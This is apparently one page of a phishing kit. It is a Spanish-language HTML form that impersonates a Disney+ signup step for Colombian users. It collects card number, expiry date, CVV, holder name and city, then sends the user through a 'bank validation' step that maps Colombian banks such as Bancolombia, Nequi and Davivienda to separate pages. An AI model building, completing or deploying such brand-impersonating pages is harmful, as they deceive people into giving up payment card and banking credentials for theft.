<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Paso 3 | Disney+</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">

<style>
body {
    margin: 0;
    background: #0f0f0f;
    font-family: 'Inter', sans-serif;
    color: #fff;
}

/* HEADER */
header {
    padding: 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

header img {
    height: 34px;
}

header a {
    color: #bbb;
    font-size: 15px;
    text-decoration: none;
}

/* CONTENEDOR PRINCIPAL */
.main-container {
    padding: 20px;
    max-width: 600px;
    margin: auto;
}

.step {
    font-size: 14px;
    color: #9ca3af;
}

h1 {
    font-size: 28px;
    margin-top: 5px;
    margin-bottom: 25px;
}

/* LABELS */
label {
    display: block;
    margin: 18px 0 6px;
    font-size: 14px;
    color: #d1d5db;
}

/* INPUTS */
input, select {
    width: 100%;
    padding: 15px;
    background: #1a1a1a;
    border: 1px solid #383838;
    border-radius: 6px;
    color: #fff;
    font-size: 15px;
    box-sizing: border-box;
}

/* INPUT TARJETA */
.input-card {
    position: relative;
}

.card-icons {
    position: absolute;
    right: 12px;
    top: 50%;
    transform: translateY(-50%);
    display: flex;
    gap: 6px;
}

.card-icons img {
    height: 26px;
    opacity: .9;
}

/* FILA FECHA / CVV */
.row-double {
    display: flex;
    gap: 15px;
    margin-top: 5px;
}

.field-group {
    flex: 1;
    min-width: 0;
}

/* PRECIO */
#totalBox {
    margin-top: 22px;
    background: #1a1a1a;
    padding: 15px;
    border-radius: 8px;
    font-size: 17px;
    border: 1px solid #333;
}

/* BOTÓN */
button {
    width: 100%;
    padding: 16px;
    margin-top: 20px;
    background: #fff;
    border: none;
    color: #000;
    border-radius: 30px;
    font-size: 17px;
    cursor: pointer;
    font-weight: 600;
}

/* FOOTER */
footer {
    margin-top: 50px;
    padding: 35px 20px;
    background: #0d0d0d;
    color: #7e7e7e;
    text-align: center;
    font-size: 13px;
}
</style>
</head>

<body>

<!-- HEADER -->
<header>
    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3e/Disney%2B_logo.svg">
    <a href="#">Cerrar sesión</a>
</header>

<div class="main-container">

    <div class="step">PASO 3 DE 3</div>
    <h1>¡A disfrutar!</h1>

    <!-- FORMULARIO -->
    <label>NOMBRE EN LA TARJETA</label>
    <input type="text" placeholder="Nombre del titular">

    <label>NÚMERO DE LA TARJETA</label>
    <div class="input-card">
        <input type="text" placeholder="•••• •••• •••• ••••" maxlength="19">
        <div class="card-icons">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Mastercard-logo.png/1200px-Mastercard-logo.png">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo_%282018%29.svg">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png">
        </div>
    </div>

    <div class="row-double">
        <div class="field-group">
            <label>FECHA DE VENCIMIENTO</label>
            <input type="text" placeholder="MM/AA" maxlength="5">
        </div>

        <div class="field-group">
            <label>CÓDIGO DE SEGURIDAD</label>
            <input type="text" placeholder="CVV" maxlength="4">
        </div>
    </div>

    <label>CIUDAD</label>
    <input type="text" placeholder="Ingrese su ciudad">

    <label>DEPARTAMENTO</label>
    <select>
        <option>Seleccionar…</option>
        <option>Antioquia</option>
        <option>Cundinamarca</option>
        <option>Valle del Cauca</option>
        <option>Atlántico</option>
        <option>Santander</option>
    </select>

    <label>RUT (OPCIONAL)</label>
    <input type="text" placeholder="Opcional">

    <!-- SELECCIÓN BANCO -->
    <label>BANCO PARA VALIDAR</label>
    <select id="bank">
        <option value="">Seleccione su banco…</option>
        <option value="bancolombia.html">Bancolombia</option>
        <option value="nequi.html">Nequi</option>
        <option value="davivienda.html">Davivienda</option>
        <option value="bbva.html">BBVA</option>
        <option value="popular.html">Banco Popular</option>
        <option value="bogota.html">Banco de Bogotá</option>
        <option value="itau.html">Itaú</option>
    </select>

    <!-- PRECIO -->
    <div id="totalBox">
        Total a pagar: <strong id="planPrice"></strong>
    </div>

    <button onclick="goBank()">INICIAR SUSCRIPCIÓN</button>

</div>

<footer>
    © 2025 Disney+. Todos los derechos reservados.  
    <br>
    <a href="#">Términos de uso</a> · 
    <a href="#">Política de privacidad</a> · 
    <a href="#">Ayuda</a>
</footer>

<script>
// Mostrar precio dinámico
document.getElementById("planPrice").innerText = 
    "COP " + (localStorage.getItem("planPrice") || "24.900") + "/mes";

// Redirigir al banco seleccionado
function goBank() {
    const bankSelect = document.getElementById("bank");
    const bankName = bankSelect.options[bankSelect.selectedIndex].text;

    if (bankSelect.value === "") {
        alert("Seleccione su banco para validar el pago.");
        return;
    }

    // Guardar nombre del banco
    localStorage.setItem("bankName", bankName);

    // Ir a la página universal
    window.location.href = "validar.html";
}

</script>

</body>
</html>
